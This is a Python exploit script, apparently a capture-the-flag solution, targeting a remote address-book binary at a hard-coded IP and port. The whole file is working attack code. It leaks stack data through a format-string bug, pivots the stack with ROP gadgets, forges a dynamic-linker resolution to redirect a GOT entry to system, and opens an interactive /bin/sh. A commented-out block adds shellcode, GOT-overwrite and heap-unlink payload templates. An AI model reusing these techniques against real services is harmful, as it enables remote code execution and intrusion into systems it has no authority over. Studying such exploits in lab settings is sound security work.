#!/usr/bin/env python
from sc_pwn import *

#rhp     = ("192.168.75.129",8080)
rhp     = ('54.165.223.128',2555)

addr_dynsym     = 0x080481d8
addr_dynstr     = 0x080482f8
addr_relplt     = 0x0804843c
addr_plt_reloc  = 0x080484d0
addr_plt_exit   = 0x08048560
addr_plt_scanf  = 0x080485b0
addr_buf        = 0x0804b0a0
addr_got_main   = 0x0804b034

addr_pop_x2     = 0x08048caa        # pop ebx ; pop ebp ; ret
addr_leave_ret  = 0x08048628
addr_stack      = addr_buf + 0xe00

addr_str_s      = 0x0804907b
entry_size      = 0x50

#==========
def attack(nc):
    Create('/bin/sh','','0x%6$08x')
    addr_disp_ebp = int(Display()[0],16)
    info('addr_disp_ebp     = 0x%08x'%addr_disp_ebp)

    fsb = FSB(size=2)
    exploit_st1  = fsb.write(6,(addr_disp_ebp+2)&0xffff)

    addr_new_ebp = addr_buf+entry_size*10+0x8
    fsb = FSB(size=2)
    exploit_st2  = fsb.write(18,addr_new_ebp>>0x10)
    exploit_st2 += fsb.write(6 ,addr_new_ebp&0xffff)

    dl = DLresolve(addr_dynsym, addr_dynstr, addr_relplt)
    dlr = dl.rewrite(addr_buf+entry_size*3+0x8, addr_got_main, 'system')

    exploit_st3  = pack_32(0xdeadbeef)
    exploit_st3 += pack_32(addr_plt_scanf)
    exploit_st3 += pack_32(addr_pop_x2)
    exploit_st3 += pack_32(addr_str_s)
    exploit_st3 += pack_32(addr_stack)
    exploit_st3 += pack_32(addr_leave_ret)
    
    payload  = pack_32(0xdeadbeef)    
    payload += pack_32(addr_plt_scanf)
    payload += pack_32(addr_pop_x2)
    payload += pack_32(addr_str_s)
    payload += pack_32(addr_buf+entry_size*3+0x8)
    payload += pack_32(addr_plt_reloc)
    payload += pack_32(dl.offset('system'))
    payload += pack_32(addr_plt_exit)
    payload += pack_32(addr_buf+0x8)
  
    Create('','',exploit_st1)
    Create('','',exploit_st2) 
    Create('','','') 
    Create('','','')
    Create('','','')
    Create('','','')
    Create('','','')
    Create('','','')
    Create('','','')
    Create(exploit_st3,'','') 
    
    Display()
    nc.read_until('>>> ')
    nc.sendln('5')
    nc.read_all()
    nc.sendln(payload)
    nc.sendln(dlr)

def Create(name,phone,desc):
    nc.read_until('>>> ')
    nc.sendln('1')
    nc.read_until('Name: ')
    nc.sendln(name)
    nc.read_until('No: ')
    nc.sendln(phone)
    nc.read_until('description: ')
    nc.sendln(str(len(desc)+1))
    nc.read_until('description:')
    nc.sendln(desc)

def Display():
    nc.read_until('>>> ')
    nc.sendln('4')

    desc = []
    data = ''
    while 'Menu' not in data:   
        data = nc.read_until('\n')
        if 'Description' in data:
            desc += [data.split(':')[1][:-1]]
    return desc

    """
    nc.read_until('\n')
    addr = nc.read(4)
    nc.read_all()

    addr_libc_main      = unpack_32(addr)
    addr_base_libc      = addr_libc_main - offset_libc_main
    addr_libc_system    = addr_base_libc + offset_libc_system
    
    info("information   = 0x%08x"%0xdeadbeef)
    proc("processed     = 0x%08x"%0xcafebabe)
    warn("waring        = 0x%08x"%0)
    fail("failure       = 0x%08x"%0)

    #==========
    
    sc = ShellCode('x86',260)
    sc.dup2(4,0)
    sc.dup2(4,1)
    ac.add('\x90')
    sc.sh()
    sc.padding()
    nc.send(sc.get())

    sc = ShellCode('x86',max_len=260)
    shellcode  = sc.dup2(4,0)
    shellcode += sc.dup2(4,1)
    shellcode += sc.execve(addr_str_sh)
    shellcode += sc.padding(None,'\x90')
    nc.send(shellcode)

    #==========
    
    fsb = FSB(header=len(shellcode),count=0,gap=2,size=2)
    fsb.set_adrval(addr_got_puts, addr_libc_system)
    fsb.set_adrval(addr_heap, 0xdeadbeef)
    fsb.auto_write(index=6)
    exploit  = shellcode
    exploit += fsb.get()
    nc.sendln(exploit)

    fsb = FSB(header=len(shellcode),count=0,size=2)
    exploit  = shellcode
    exploit += fsb.addr(addr_got_puts)
    exploit += fsb.addr(addr_got_puts+0x02)
    exploit += fsb.write(6,addr_libc_system&0xffff)
    exploit += fsb.write(7,addr_libc_system>>0x10)
    nc.sendln(exploit)

    #==========
    
    dl = DLresolve(addr_dynsym, addr_dynstr, addr_relplt)
    dlr = dl.rewrite(addr_buf, addr_got_puts, 'system')
    nc.sendln(dlr)
    
    dl = DLresolve(addr_dynsym, addr_dynstr, addr_relplt)
    dl.set_funcadr(addr_got_fgets,'gets')
    dl.set_funcadr(addr_got_puts,'system')
    dlr = dl.auto_rewrite(addr_buf)
    nc.sendln(dlr)

    exploit  = pack_32(addr_plt_reloc)
    exploit += pack_32(dl.offset('system'))
    exploit += pack_32(addr_plt_exit)
    exploit += pack_32(addr_buf)

    #==========
    
    exploit  = pack_32(heap_sb(0xc,PREV_INUSE|IS_MMAPED|IS_NON_MAINARENA))  # p->size
    exploit += pack_32(addr_got_puts-0x8)                                   # p->fd
    exploit += pack_32(addr_heap)                                           # p->bk
    nc.sendln(exploit)

    nc.read_all()
    """

#==========

if __name__=='__main__':
    nc = Communicate(rhp)
    attack(nc)

    sh = Shell(nc)
    sh.select()

    del(sh)
    del(nc)
    
#==========
